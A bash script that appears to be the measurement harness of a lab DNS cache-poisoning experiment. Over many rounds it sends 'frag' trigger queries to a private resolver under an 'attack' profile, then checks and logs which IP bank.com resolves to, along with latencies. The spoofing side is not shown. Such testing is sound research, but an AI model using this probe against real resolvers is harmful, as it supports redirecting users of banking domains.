#!/bin/bash
set -euo pipefail

RESOLVER="${RESOLVER_IP:-10.60.0.53}"
TARGET_ZONE="${1:-example.net}"
ROUNDS="${2:-${ROUNDS:-150}}"
PROFILE="${3:-attack}"
RESULT_FILE="/app/result.txt"
TRIGGER_LAT_FILE="/app/trigger_latency_ms.txt"
BANK_LAT_FILE="/app/bank_latency_ms.txt"
ROUND_FILE="/app/rounds.tsv"
TRIGGER_RAW_FILE="/app/trigger_raw.tsv"

monotonic_ns() {
    awk '{ printf "%.0f", $1 * 1000000000 }' /proc/uptime
}

rm -f "$RESULT_FILE" "$TRIGGER_LAT_FILE" "$BANK_LAT_FILE" "$ROUND_FILE" "$TRIGGER_RAW_FILE"
printf "round\tqname\ttrigger_ms\tbank_ms\tbank_ip\ttrigger_status\ttrigger_rc\tbank_rc\n" > "$ROUND_FILE"
printf "round\tqname\ttrigger_rc\ttrigger_status\toutput_b64\n" > "$TRIGGER_RAW_FILE"

echo "[+] E5 probe: zone=${TARGET_ZONE}, rounds=${ROUNDS}, resolver=${RESOLVER}, profile=${PROFILE}"

for i in $(seq 1 "$ROUNDS")
do
    if [ "$PROFILE" = "baseline" ]; then
        QNAME="safe${i}.$(monotonic_ns).${TARGET_ZONE}"
    else
        QNAME="frag${i}.$(monotonic_ns).${TARGET_ZONE}"
    fi

    START_NS="$(monotonic_ns)"
    if TRIGGER_OUT="$(dig @"$RESOLVER" "$QNAME" +tries=1 +time=1 +noall +answer +comments 2>&1)"; then
        TRIGGER_RC=0
    else
        TRIGGER_RC=$?
    fi
    END_NS="$(monotonic_ns)"
    TRIGGER_MS="$(awk -v s="$START_NS" -v e="$END_NS" 'BEGIN { printf "%.3f", (e - s) / 1000000.0 }')"
    if echo "$TRIGGER_OUT" | grep -Eiq "truncated, retrying in TCP mode|flags:.*(^|[[:space:]])tc([[:space:]]|$)"; then
        if [ "$TRIGGER_RC" -eq 0 ]; then
            TRIGGER_STATUS="truncated"
        else
            TRIGGER_STATUS="truncated_tcp_fallback_error"
        fi
    elif [ "$TRIGGER_RC" -ne 0 ]; then
        TRIGGER_STATUS="command_error"
    elif echo "$TRIGGER_OUT" | grep -Eq "status: (SERVFAIL|REFUSED|NXDOMAIN)"; then
        TRIGGER_STATUS="servfail"
    elif echo "$TRIGGER_OUT" | grep -Eq "flags:.*(^|[[:space:]])tc([[:space:]]|$)"; then
        TRIGGER_STATUS="truncated"
    elif echo "$TRIGGER_OUT" | grep -Eq "(^|[[:space:]])IN[[:space:]]+A[[:space:]]+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+"; then
        TRIGGER_STATUS="answer"
    else
        TRIGGER_STATUS="empty_or_timeout"
    fi

    TRIGGER_B64="$(printf '%s' "$TRIGGER_OUT" | base64 -w 0)"
    printf "%s\t%s\t%s\t%s\t%s\n" "$i" "$QNAME" "$TRIGGER_RC" "$TRIGGER_STATUS" "$TRIGGER_B64" >> "$TRIGGER_RAW_FILE"

    START_NS="$(monotonic_ns)"
    if BANK_OUT="$(dig @"$RESOLVER" bank.com +tries=1 +time=1 +short 2>&1)"; then
        BANK_RC=0
    else
        BANK_RC=$?
    fi
    BANK_IP="$(printf '%s\n' "$BANK_OUT" | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/{print; exit}' | tr -d '\r')"
    END_NS="$(monotonic_ns)"
    BANK_MS="$(awk -v s="$START_NS" -v e="$END_NS" 'BEGIN { printf "%.3f", (e - s) / 1000000.0 }')"
    if [ -z "$BANK_IP" ]; then
        BANK_IP="NOANSWER"
    fi

    echo "$BANK_IP" >> "$RESULT_FILE"
    echo "$TRIGGER_MS" >> "$TRIGGER_LAT_FILE"
    echo "$BANK_MS" >> "$BANK_LAT_FILE"
    printf "%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n" "$i" "$QNAME" "$TRIGGER_MS" "$BANK_MS" "$BANK_IP" "$TRIGGER_STATUS" "$TRIGGER_RC" "$BANK_RC" >> "$ROUND_FILE"
    echo "[$i/$ROUNDS] trigger=${QNAME} status=${TRIGGER_STATUS} rc=${TRIGGER_RC} bank.com -> $BANK_IP rc=${BANK_RC} | trigger=${TRIGGER_MS}ms bank=${BANK_MS}ms"
done

echo "[+] Done. Results saved to $RESULT_FILE"
